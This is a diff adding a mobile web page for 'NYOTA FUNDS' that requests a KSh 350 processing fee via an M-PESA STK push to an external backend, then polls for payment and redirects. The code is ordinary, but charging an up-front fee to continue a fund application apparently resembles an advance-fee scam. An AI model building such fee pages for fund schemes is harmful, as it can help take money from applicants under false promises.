@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>NYOTA FUNDS</title>
+
+<style>
+*{
+    box-sizing:border-box;
+}
+
+body{
+    margin:0;
+    padding:16px 10px;
+    font-family:Arial,sans-serif;
+    background:#0B0217;
+    color:#fff;
+}
+
+.container{
+    width:100%;
+    max-width:430px;
+    margin:0 auto;
+}
+
+.card{
+    width:100%;
+    background:
+        linear-gradient(
+            145deg,
+            rgba(255,255,255,0.09),
+            rgba(255,255,255,0.035)
+        );
+    padding:22px 18px 18px;
+    border-radius:18px;
+
+    box-shadow:
+        0 20px 60px rgba(0,0,0,0.45),
+        inset 0 1px 0 rgba(255,255,255,0.05);
+
+    border:1px solid rgba(255,255,255,0.10);
+}
+
+h1{
+    text-align:center;
+    color:#fff;
+    font-size:22px;
+    font-weight:700;
+    margin:2px 0 16px;
+}
+
+p{
+    text-align:center;
+    font-size:14px;
+    line-height:1.5;
+    color:rgba(255,255,255,0.72);
+}
+
+.amount{
+    background:rgba(155,53,255,0.08);
+    border:1px solid rgba(155,53,255,0.18);
+    border-radius:12px;
+    padding:14px 10px;
+    font-size:20px;
+    font-weight:700;
+    text-align:center;
+    color:#fff;
+    margin:18px 0;
+}
+
+label{
+    display:block;
+    margin-top:15px;
+    margin-bottom:7px;
+    font-size:14px;
+    font-weight:700;
+    color:rgba(255,255,255,0.88);
+}
+
+input{
+    width:100%;
+    padding:14px 12px;
+    border:1px solid rgba(255,255,255,0.12);
+    border-radius:10px;
+    font-size:16px;
+    background:rgba(255,255,255,0.07);
+    color:#fff;
+    outline:none;
+}
+
+input:focus{
+    border-color:rgba(169,72,255,0.8);
+    box-shadow:0 0 0 3px rgba(155,55,255,0.12);
+}
+
+button{
+    width:100%;
+    padding:15px;
+    margin-top:17px;
+    background:linear-gradient(135deg,#9B35FF,#6C1DCE);
+    color:white;
+    border:none;
+    border-radius:11px;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+    box-shadow:0 10px 30px rgba(137,43,226,0.30);
+}
+
+button:hover{
+    background:linear-gradient(135deg,#A844FF,#7625DC);
+}
+
+button:active{
+    transform:scale(.98);
+}
+
+button:disabled{
+    background:rgba(255,255,255,0.25);
+    cursor:not-allowed;
+    box-shadow:none;
+}
+
+#stkMessage{
+    min-height:20px;
+    margin-top:13px;
+    color:#B86CFF;
+    font-size:13px;
+    font-weight:600;
+    line-height:1.5;
+}
+
+@media(max-width:360px){
+
+    body{
+        padding:10px 7px;
+    }
+
+    .card{
+        padding:18px 13px 15px;
+        border-radius:15px;
+    }
+
+    h1{
+        font-size:20px;
+    }
+
+    button{
+        padding:14px;
+        font-size:15px;
+    }
+
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="card">
+
+<h1>Processing Fee</h1>
+
+<p>
+Welcome, <strong><span id="name"></span></strong>
+</p>
+
+<p>
+To continue with your NYOTA Fund application, please complete the processing fee payment below.
+</p>
+
+<div class="amount" id="feeAmount">
+Processing Fee: KSh 350
+</div>
+
+<label>Full Name</label>
+
+<input type="text" id="fullName" readonly>
+
+<label>M-PESA Phone Number</label>
+
+<input
+type="tel"
+id="phone"
+placeholder="2547XXXXXXXX">
+
+<button id="payBtn" onclick="payNow()">
+Pay Processing Fee
+</button>
+
+<p id="stkMessage"></p>
+
+</div>
+
+</div>
+
+<script>
+
+let applicant = localStorage.getItem("applicantName");
+
+document.getElementById("name").innerHTML =
+    applicant || "Applicant";
+
+document.getElementById("fullName").value =
+    applicant || "";
+
+let processingFee =
+    localStorage.getItem("processingFee") || "350";
+
+document.getElementById("feeAmount").innerHTML =
+    "Processing Fee: KSh " +
+    Number(processingFee).toLocaleString();
+
+
+async function payNow() {
+
+    let phone =
+        document.getElementById("phone").value.trim();
+
+    localStorage.setItem(
+        "phoneNumber",
+        phone
+    );
+
+    localStorage.setItem(
+        "fullName",
+        document.getElementById("fullName").value
+    );
+
+    let btn =
+        document.getElementById("payBtn");
+
+    if (phone === "") {
+
+        alert(
+            "Please enter your M-PESA phone number."
+        );
+
+        return;
+    }
+
+    btn.innerHTML =
+        "Sending STK Push...";
+
+    btn.disabled = true;
+
+    try {
+
+        let response = await fetch(
+            "https://nyota-funds-backend.onrender.com/stk-push",
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type":
+                        "application/json"
+                },
+
+                body: JSON.stringify({
+                    phone: phone,
+
+                    amount:
+                        Number(processingFee)
+                })
+            }
+        );
+
+        let data =
+            await response.json();
+
+        console.log(
+            "STK RESPONSE:",
+            data
+        );
+
+        if (!response.ok || !data.success) {
+
+            throw new Error(
+                data.message ||
+                "STK Push failed"
+            );
+        }
+
+        /*
+         * Paylor returns transactionId.
+         * Our backend also returns it as
+         * checkout_request_id for compatibility.
+         */
+
+        let transactionId =
+            data.transactionId ||
+            data.checkout_request_id;
+
+        if (!transactionId) {
+
+            throw new Error(
+                "No Paylor transaction ID received"
+            );
+        }
+
+        btn.innerHTML =
+    "Processing...";
+
+        document.getElementById(
+            "stkMessage"
+        ).innerHTML =
+            "An M-PESA payment request has been sent to your phone. Please enter your M-PESA PIN to complete the payment.";
+
+        checkPayment(
+            transactionId
+        );
+
+    } catch (error) {
+
+        console.log(
+            "PAYMENT ERROR:",
+            error
+        );
+
+        alert(
+            error.message ||
+            "Payment request failed."
+        );
+
+        btn.innerHTML =
+            "Pay Processing Fee";
+
+        btn.disabled = false;
+    }
+}
+
+
+async function checkPayment(
+    transactionId
+) {
+
+    let interval =
+        setInterval(async () => {
+
+            try {
+
+                let response =
+                    await fetch(
+                        "https://nyota-funds-backend.onrender.com/payment-status",
+                        {
+                            method: "POST",
+
+                            headers: {
+                                "Content-Type":
+                                    "application/json"
+                            },
+
+                            body:
+                                JSON.stringify({
+                                    transactionId:
+                                        transactionId
+                                })
+                        }
+                    );
+
+                let result =
+                    await response.json();
+
+                console.log(
+                    "PAYMENT STATUS:",
+                    result
+                );
+
+                if (
+                    !result.success ||
+                    !result.data
+                ) {
+                    return;
+                }
+
+                let payment =
+                    result.data;
+
+                let status =
+                    String(
+                        payment.status || ""
+                    ).toUpperCase();
+
+
+                if (
+                    status === "COMPLETED"
+                ) {
+
+                    clearInterval(
+                        interval
+                    );
+
+                    document.getElementById(
+                        "stkMessage"
+                    ).innerHTML =
+                        "✅ Payment successful. Redirecting...";
+
+                    window.location.href =
+                        "delivery.html";
+                }
+
+
+                else if (
+                    status === "CANCELLED" ||
+                    status === "FAILED"
+                ) {
+
+                    clearInterval(
+                        interval
+                    );
+
+                    document.getElementById(
+                        "stkMessage"
+                    ).innerHTML =
+                        "❌ Payment " +
+                        status.toLowerCase() +
+                        ".";
+
+                    document.getElementById(
+                        "payBtn"
+                    ).disabled = false;
+
+                    document.getElementById(
+                        "payBtn"
+                    ).innerHTML =
+                        "Pay Processing Fee";
+                }
+
+            } catch (error) {
+
+                console.log(
+                    "STATUS ERROR:",
+                    error
+                );
+
+            }
+
+        }, 3000);
+
+}
+
+</script>
+
+</body>
+
+</html>
